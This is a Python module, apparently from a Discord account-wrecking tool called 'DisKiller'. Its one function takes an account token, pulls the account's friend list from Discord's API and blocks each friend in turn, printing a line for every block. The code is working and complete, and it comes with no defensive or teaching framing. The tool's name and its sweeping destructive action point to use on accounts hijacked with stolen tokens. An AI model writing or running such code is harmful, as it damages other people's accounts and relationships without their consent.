import requests
from data.common import *

def blockAllFriends(token):
    set_console_title("DisKiller | Block All Friends")
    headers = {"authorization": token, "user-agent": "bruh6/9"}
    json = {"type": 2}
    block_friends_request = requests.get("https://canary.discord.com/api/v8/users/@me/relationships", headers=headers).json()
    for i in block_friends_request:
        requests.put(
            f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
            headers=headers,
            json=json,
        )
        print(f"{rr}[{w} + {rr}]{w} Blocked Friend |{rr} {i['id']}")